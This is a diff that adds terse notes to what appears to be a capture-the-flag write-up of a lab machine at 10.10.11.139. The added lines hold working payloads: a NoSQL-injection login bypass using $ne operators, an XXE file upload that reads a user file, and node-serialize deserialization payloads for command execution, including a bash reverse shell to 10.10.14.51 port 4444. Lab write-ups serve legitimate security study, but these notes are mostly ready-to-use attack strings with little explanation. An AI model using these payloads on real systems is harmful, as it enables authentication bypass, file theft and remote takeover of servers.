@@ -12,5 +12,48 @@ PORT     STATE SERVICE VERSION
 |_http-title: Blog
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
+[+]Authentication Bypass[+]
+http://10.10.11.139:5000/login
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
 
-https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf
+Basic authentication bypass using not equal ($ne) or greater ($gt)
+Original Payload : {"username": {"$ne": null}, "password": {"$ne": null}}
+noSQL injection >> 
+                  IN JSON >> 
+                             BURPSUITE >> 
+                                         Content-Type: application/json
+                                         {"user": {"$ne": "root"}, "password": {"$ne": "root"}} >> LOGIN SUCESS.
+                                         
+http://10.10.11.139:5000/login
+New Article
+Upload
+
+[+]XXE[+] 
+https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
+
+Upload xxe-rce.xml >>
+<!--?xml version="1.0" ?-->
+<!DOCTYPE body [<!ENTITY example SYSTEM "/home/admin/user.txt"> ]>
+<body>
+        <markdown>&example;</markdown>
+</body>
+
+Response : /etc/passwd
+
+[+]NODE SERIALISE[+]
+https://book.hacktricks.xyz/pentesting-web/deserialization
+
+Payload Ping Comprobation Conectivity {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ping -c 2 $IP', function(error, stdout, stderr) { console.log(stdout) })}"}
+Url encode all characters if not work at first ...
+
+Payload Revershell  >> {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -i >& /dev/tcp/10.10.14.51/4444 0>&1', function(error, stdout, stderr) {console.log(stdout) }); }()"};
+serialize.unserialize(test);
+
+
+
+
+
+
+
+
+
